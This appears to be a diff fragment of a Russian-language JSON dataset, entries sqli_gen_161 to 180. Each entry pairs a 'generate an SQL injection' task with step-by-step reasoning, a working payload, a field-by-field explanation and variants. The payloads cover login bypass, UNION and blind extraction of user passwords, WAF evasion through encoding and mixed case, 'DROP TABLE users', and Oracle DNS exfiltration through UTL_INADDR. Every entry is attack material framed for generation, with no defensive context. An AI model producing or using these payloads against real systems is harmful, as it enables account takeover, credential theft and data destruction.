+        "task": "Сгенерировать SQL-инъекцию для обхода аутентификации через LIKE",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "vulnerability": "Authentication Bypass",
+            "technique": "LIKE wildcard"
+        },
+        "reasoning": "1. Используем LIKE с wildcard % для обхода. 2. Закрываем кавычку и добавляем LIKE. 3. Комментируем пароль.",
+        "payload": "admin' LIKE '%'--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "LIKE '%'": "всегда истинно (все строки)",
+            "--": "комментарий"
+        },
+        "expected_behavior": "WHERE username='admin' LIKE '%'-- AND password='...' → обход",
+        "confidence": 0.87,
+        "variants": [
+            "admin' OR username LIKE '%'--",
+            "admin' AND 1=1 LIKE 1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_162",
+        "task": "Сгенерировать SQL-инъекцию через EXECUTE IMMEDIATE",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "oracle",
+            "vulnerability": "Dynamic SQL Injection",
+            "technique": "EXECUTE IMMEDIATE"
+        },
+        "reasoning": "1. Oracle EXECUTE IMMEDIATE для динамического SQL. 2. Выполнение произвольных запросов. 3. Обход фильтров.",
+        "payload": "admin'; EXECUTE IMMEDIATE 'SELECT * FROM users'--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            ";": "разделитель",
+            "EXECUTE IMMEDIATE": "динамическое выполнение",
+            "'SELECT * FROM users'": "вредоносный запрос",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Выполнение произвольного SQL",
+        "confidence": 0.73,
+        "variants": [
+            "1; EXECUTE IMMEDIATE 'DROP TABLE users'--",
+            "'||EXECUTE IMMEDIATE('SELECT * FROM dual')--"
+        ]
+    },
+    {
+        "id": "sqli_gen_163",
+        "task": "Сгенерировать SQL-инъекцию через XMLPath",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "xml_api",
+            "backend": "mysql",
+            "vulnerability": "XPath Injection",
+            "technique": "ExtractValue"
+        },
+        "reasoning": "1. Используем XPath функции для error-based. 2. ExtractValue с вредоносным XPath. 3. Вывод данных в ошибке.",
+        "payload": "1 AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))",
+        "payload_explained": {
+            "1 AND": "условие",
+            "extractvalue()": "XPath функция",
+            "concat()": "объединение",
+            "0x7e": "тильда маркер",
+            "SELECT version()": "данные для извлечения"
+        },
+        "expected_behavior": "Ошибка с версией MySQL",
+        "confidence": 0.85,
+        "variants": [
+            "1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)",
+            "1 AND (SELECT * FROM (SELECT(1))x)"
+        ]
+    },
+    {
+        "id": "sqli_gen_164",
+        "task": "Сгенерировать SQL-инъекцию через JSON функции MySQL",
+        "input": {
+            "field": "data",
+            "field_type": "json",
+            "context": "json_api",
+            "backend": "mysql",
+            "version": "5.7+",
+            "technique": "JSON_EXTRACT"
+        },
+        "reasoning": "1. Используем JSON_EXTRACT для инъекции. 2. Error-based через невалидный JSON. 3. Извлечение данных.",
+        "payload": "1 AND JSON_EXTRACT('{\"a\":\"' AND (SELECT version()) AND '\"}', '$.a')",
+        "payload_explained": {
+            "1 AND": "условие",
+            "JSON_EXTRACT()": "функция JSON",
+            "SELECT version()": "инъекция в JSON",
+            "'$.a'": "JSON путь"
+        },
+        "expected_behavior": "Ошибка с данными",
+        "confidence": 0.78,
+        "variants": [
+            "1 AND JSON_KEYS(CONCAT('{\"a\":\"',(SELECT user()),'\"}'))",
+            "1 AND JSON_LENGTH(CONCAT('[',(SELECT database()),']'))"
+        ]
+    },
+    {
+        "id": "sqli_gen_165",
+        "task": "Сгенерировать SQL-инъекцию через математические операции",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "vulnerability": "Boolean Blind",
+            "technique": "Mathematical"
+        },
+        "reasoning": "1. Используем математические операции для Boolean blind. 2. DIV, MOD, POW для условий. 3. Постепенное извлечение.",
+        "payload": "1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) DIV 100 = 0",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT ASCII()": "код символа",
+            "DIV 100": "целочисленное деление",
+            "= 0": "проверка что символ < 100"
+        },
+        "expected_behavior": "Разные результаты при разных значениях",
+        "confidence": 0.76,
+        "variants": [
+            "1 AND (SELECT ORD(SUBSTRING(password,1,1)) FROM users) MOD 2 = 1",
+            "1 AND POW((SELECT MID(password,1,1) FROM users),0)=1"
+        ]
+    },
+    {
+        "id": "sqli_gen_166",
+        "task": "Сгенерировать SQL-инъекцию через битовые сдвиги",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "vulnerability": "Bitwise Blind",
+            "technique": "Bit shifting"
+        },
+        "reasoning": "1. Битовые сдвиги для извлечения битов. 2. >> и << операторы. 3. Постепенное извлечение.",
+        "payload": "1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users) >> 4 = 5",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT ASCII()": "код символа",
+            ">> 4": "сдвиг вправо на 4 бита",
+            "= 5": "проверка старшего полубайта"
+        },
+        "expected_behavior": "Постепенное извлечение битов",
+        "confidence": 0.74,
+        "variants": [
+            "1 AND (SELECT ORD(SUBSTRING(password,1,1)) FROM users) & 15 = 10",
+            "1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users) << 1 > 200"
+        ]
+    },
+    {
+        "id": "sqli_gen_167",
+        "task": "Сгенерировать SQL-инъекцию через оконные функции",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "report_api",
+            "backend": "postgresql",
+            "version": "9.4+",
+            "technique": "Window Functions"
+        },
+        "reasoning": "1. Оконные функции для извлечения данных. 2. ROW_NUMBER, RANK. 3. UNION с оконными функциями.",
+        "payload": "1 UNION SELECT ROW_NUMBER() OVER (ORDER BY username), username, password FROM users--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "ROW_NUMBER() OVER()": "оконная функция",
+            "username, password": "целевые данные",
+            "FROM users": "таблица"
+        },
+        "expected_behavior": "Вывод данных с нумерацией",
+        "confidence": 0.80,
+        "variants": [
+            "1 UNION SELECT RANK() OVER (ORDER BY id), username, password FROM users--",
+            "1 UNION SELECT LAG(username) OVER (ORDER BY id), username, password FROM users--"
+        ]
+    },
+    {
+        "id": "sqli_gen_168",
+        "task": "Сгенерировать SQL-инъекцию через общие табличные выражения (CTE)",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "sqlite",
+            "version": "3.8.3+",
+            "technique": "WITH RECURSIVE"
+        },
+        "reasoning": "1. CTE для рекурсивных запросов. 2. Извлечение данных через рекурсию. 3. Обход фильтров.",
+        "payload": "' WITH RECURSIVE cte(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cte WHERE x<10) SELECT * FROM cte--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "WITH RECURSIVE": "рекурсивное CTE",
+            "cte(x) AS": "определение",
+            "SELECT 1 UNION ALL SELECT x+1": "рекурсия",
+            "SELECT * FROM cte": "вывод"
+        },
+        "expected_behavior": "Рекурсивный вывод данных",
+        "confidence": 0.77,
+        "variants": [
+            "' WITH data AS (SELECT username,password FROM users) SELECT * FROM data--",
+            "1 WITH t AS (SELECT 1 UNION SELECT 2) SELECT * FROM t--"
+        ]
+    },
+    {
+        "id": "sqli_gen_169",
+        "task": "Сгенерировать SQL-инъекцию через PIVOT/UNPIVOT",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "report_api",
+            "backend": "sqlserver",
+            "technique": "PIVOT Injection"
+        },
+        "reasoning": "1. PIVOT для трансформации данных. 2. Извлечение данных через PIVOT. 3. Обход фильтров.",
+        "payload": "1 UNION SELECT * FROM (SELECT username, password FROM users) AS src PIVOT (MAX(password) FOR username IN ([admin], [user])) AS pvt--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "PIVOT": "поворот таблицы",
+            "MAX(password)": "агрегация",
+            "FOR username IN": "столбцы поворота"
+        },
+        "expected_behavior": "Трансформированные данные",
+        "confidence": 0.71,
+        "variants": [
+            "1 UNION SELECT * FROM (SELECT role, username FROM users) UNPIVOT (value FOR col IN (username)) AS unpvt--"
+        ]
+    },
+    {
+        "id": "sqli_gen_170",
+        "task": "Сгенерировать SQL-инъекцию через пространственные функции",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "gis_api",
+            "backend": "mysql",
+            "technique": "Spatial Functions"
+        },
+        "reasoning": "1. Пространственные функции для error-based. 2. ST_GeomFromText, ST_PointFromGeoHash. 3. Вывод данных в ошибках.",
+        "payload": "1 AND ST_GeomFromText(CONCAT('POINT(', (SELECT version()), ' 1)'))",
+        "payload_explained": {
+            "1 AND": "условие",
+            "ST_GeomFromText()": "пространственная функция",
+            "CONCAT()": "объединение",
+            "SELECT version()": "данные для извлечения"
+        },
+        "expected_behavior": "Ошибка с версией",
+        "confidence": 0.72,
+        "variants": [
+            "1 AND ST_PointFromGeoHash((SELECT user()), 1)",
+            "1 AND ST_LatFromGeoHash((SELECT database()))"
+        ]
+    },
+    {
+        "id": "sqli_gen_171",
+        "task": "Сгенерировать SQL-инъекцию через полиморфные запросы",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "vulnerability": "WAF Bypass",
+            "technique": "Polymorphic"
+        },
+        "reasoning": "1. Полиморфные запросы для обхода WAF. 2. Случайные комментарии. 3. Различные варианты регистра.",
+        "payload": "aDmIn'/*!12345%0aOr%0a*/'1'='1'--",
+        "payload_explained": {
+            "aDmIn'": "смешанный регистр",
+            "/*!12345": "условный комментарий",
+            "%0aOr%0a": "перенос строки с OR",
+            "'1'='1'": "всегда истинно",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход WAF через полиморфизм",
+        "confidence": 0.81,
+        "variants": [
+            "AdMiN'/**/oR/**/'1'='1'--",
+            "admin'/*!OR*/'1'='1'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_172",
+        "task": "Сгенерировать SQL-инъекцию через двойное кодирование",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "vulnerability": "WAF Bypass",
+            "technique": "Double Encoding"
+        },
+        "reasoning": "1. Двойное URL-кодирование. 2. %2527 для апострофа. 3. Обход WAF проверяющих один уровень.",
+        "payload": "admin%2527%2520or%25201%253D1%2520--",
+        "payload_explained": {
+            "admin": "имя",
+            "%2527": "двойной encode апострофа",
+            "%2520": "двойной encode пробела",
+            "or": "логическое ИЛИ",
+            "1%253D1": "1=1",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход WAF через двойное кодирование",
+        "confidence": 0.83,
+        "variants": [
+            "admin%2527%2520or%25201%253D1%2523",
+            "%2561%2564%256D%2569%256E%2527%2520or%25201%253D1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_173",
+        "task": "Сгенерировать SQL-инъекцию через символы обратного слэша",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "mysql",
+            "filter": "addslashes",
+            "technique": "Backslash Escape"
+        },
+        "reasoning": "1. Используем обратный слэш для экранирования. 2. Экранирование следующей кавычки. 3. Обход addslashes.",
+        "payload": "admin\\' OR 1=1--",
+        "payload_explained": {
+            "admin\\'": "обратный слэш экранирует кавычку",
+            "OR 1=1": "условие",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Экранирование кавычки и выполнение инъекции",
+        "confidence": 0.79,
+        "variants": [
+            "admin\\' AND 1=1--",
+            "admin\\\\' OR 1=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_174",
+        "task": "Сгенерировать SQL-инъекцию через конкатенацию с CHAR()",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "mysql",
+            "vulnerability": "WAF Bypass",
+            "technique": "CHAR Concatenation"
+        },
+        "reasoning": "1. CHAR() для построения ключевых слов. 2. Обход сигнатур WAF. 3. Динамическое создание запроса.",
+        "payload": "' UNION SELECT 1,2,CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101)) FROM users--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "CONCAT(CHAR())": "сборка слова 'username'",
+            "FROM users": "таблица"
+        },
+        "expected_behavior": "Вывод данных без ключевых слов",
+        "confidence": 0.76,
+        "variants": [
+            "' UNION SELECT CHAR(115,101,108,101,99,116) FROM dual--",
+            "1 AND (SELECT CONCAT(CHAR(115),CHAR(101),CHAR(108)))"
+        ]
+    },
+    {
+        "id": "sqli_gen_175",
+        "task": "Сгенерировать SQL-инъекцию через NULL байт",
+        "input": {
+            "field": "filename",
+            "field_type": "string",
+            "context": "file_upload",
+            "backend": "mysql",
+            "filter": "extension_check",
+            "technique": "Null Byte Injection"
+        },
+        "reasoning": "1. NULL байт (%00) для обрезания строки. 2. Обход проверок расширений. 3. Внедрение в пути.",
+        "payload": "shell.php%00.jpg' UNION SELECT 1,2,3--",
+        "payload_explained": {
+            "shell.php": "целевой файл",
+            "%00": "NULL байт (обрезает строку)",
+            ".jpg": "обход проверки",
+            "' UNION SELECT": "SQL инъекция"
+        },
+        "expected_behavior": "Обход проверок расширений",
+        "confidence": 0.70,
+        "variants": [
+            "admin'%00' OR 1=1--",
+            "1%00' UNION SELECT null,null--"
+        ]
+    },
+    {
+        "id": "sqli_gen_176",
+        "task": "Сгенерировать SQL-инъекцию через IFNULL/COALESCE",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "mysql",
+            "vulnerability": "Boolean Blind",
+            "technique": "IFNULL/COALESCE"
+        },
+        "reasoning": "1. Используем IFNULL для boolean blind. 2. Подзапрос внутри IFNULL. 3. Разные результаты.",
+        "payload": "1 AND IFNULL((SELECT 1 FROM users WHERE ASCII(SUBSTRING(password,1,1))>50),0)=1",
+        "payload_explained": {
+            "1 AND": "условие",
+            "IFNULL()": "возвращает первое не NULL",
+            "SELECT 1 FROM users WHERE": "подзапрос",
+            "ASCII(SUBSTRING())>50": "условие",
+            "=1": "проверка"
+        },
+        "expected_behavior": "Разные результаты",
+        "confidence": 0.75,
+        "variants": [
+            "1 AND COALESCE((SELECT 1 FROM users LIMIT 1),0)=1",
+            "1 AND IFNULL((SELECT password FROM users LIMIT 1),'a')='a'"
+        ]
+    },
+    {
+        "id": "sqli_gen_177",
+        "task": "Сгенерировать SQL-инъекцию через RANDOMBLOB/SHA1",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "url_parameter",
+            "backend": "sqlite",
+            "vulnerability": "Time-based Blind",
+            "technique": "Heavy Computation"
+        },
+        "reasoning": "1. Используем тяжелые вычисления для задержки. 2. RANDOMBLOB, SHA1, HEX. 3. Time-based без SLEEP.",
+        "payload": "1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) AS t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) AS t2)",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT COUNT(*) FROM": "подсчет",
+            "UNION": "декартово произведение",
+            "AS t1, AS t2": "множественные таблицы"
+        },
+        "expected_behavior": "Задержка от тяжелого запроса",
+        "confidence": 0.73,
+        "variants": [
+            "1 AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master, sqlite_master)",
+            "1 AND (SELECT SHA1(RANDOMBLOB(10000000)))"
+        ]
+    },
+    {
+        "id": "sqli_gen_178",
+        "task": "Сгенерировать SQL-инъекцию через замороженные таблицы",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "postgresql",
+            "vulnerability": "Information Schema",
+            "technique": "pg_class/pg_attribute"
+        },
+        "reasoning": "1. Используем системные каталоги. 2. pg_class для таблиц. 3. pg_attribute для колонок.",
+        "payload": "' UNION SELECT relname, attname, NULL FROM pg_class JOIN pg_attribute ON pg_class.oid = pg_attribute.attrelid WHERE relname LIKE 'users%'--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "relname": "имя таблицы",
+            "attname": "имя колонки",
+            "FROM pg_class JOIN pg_attribute": "системные таблицы",
+            "WHERE relname LIKE 'users%'": "фильтр"
+        },
+        "expected_behavior": "Структура таблиц PostgreSQL",
+        "confidence": 0.82,
+        "variants": [
+            "' UNION SELECT table_name, column_name, data_type FROM information_schema.columns--",
+            "1 UNION SELECT schemaname, tablename, tableowner FROM pg_tables--"
+        ]
+    },
+    {
+        "id": "sqli_gen_179",
+        "task": "Сгенерировать SQL-инъекцию через DBMS_XMLGEN",
+        "input": {
+            "field": "username",
+            "field_type": "string",
+            "context": "xml_api",
+            "backend": "oracle",
+            "technique": "XMLGEN Function"
+        },
+        "reasoning": "1. DBMS_XMLGEN для генерации XML. 2. Error-based через XML. 3. Извлечение данных.",
+        "payload": "admin' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT DBMS_XMLGEN.GETXML('SELECT password FROM users WHERE username=''admin''') FROM dual))--",
+        "payload_explained": {
+            "admin'": "закрывает строку",
+            "AND 1=": "условие",
+            "UTL_INADDR.GET_HOST_ADDRESS()": "DNS запрос",
+            "DBMS_XMLGEN.GETXML()": "генерация XML",
+            "SELECT password": "данные для извлечения"
+        },
+        "expected_behavior": "DNS эксфильтрация XML данных",
+        "confidence": 0.68,
+        "variants": [
+            "admin' AND DBMS_XMLGEN.GETXML('SELECT * FROM users') IS NOT NULL--",
+            "1 AND (SELECT DBMS_XMLGEN.GETXML('SELECT user FROM dual') FROM dual)='a'"
+        ]
+    },
+    {
+        "id": "sqli_gen_180",
+        "task": "Сгенерировать SQL-инъекцию через HAVING с GROUP BY",
+        "input": {
+            "field": "category",
+            "field_type": "string",
+            "context": "group_by",
+            "backend": "mysql",
+            "vulnerability": "Error-based",
+            "technique": "HAVING Clause"
+        },
+        "reasoning": "1. HAVING с GROUP BY для error-based. 2. Конкатенация с данными. 3. Вывод в ошибке.",
+        "payload": "' GROUP BY CONCAT((SELECT version()), FLOOR(RAND(0)*2)) HAVING 1=1--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "GROUP BY": "группировка",
+            "CONCAT()": "объединение",
+            "SELECT version()": "целевые данные",
+            "FLOOR(RAND(0)*2)": "дубликат для ошибки",
+            "HAVING 1=1": "условие"
+        },
+        "expected_behavior": "Ошибка с версией",
+        "confidence": 0.84,
+        "variants": [
+            "1 GROUP BY CONCAT((SELECT user()), FLOOR(RAND(0)*2))",
+            "' GROUP BY CONCAT((SELECT database()), RAND()) HAVING 1=1--"
+        ]
+    }
+]
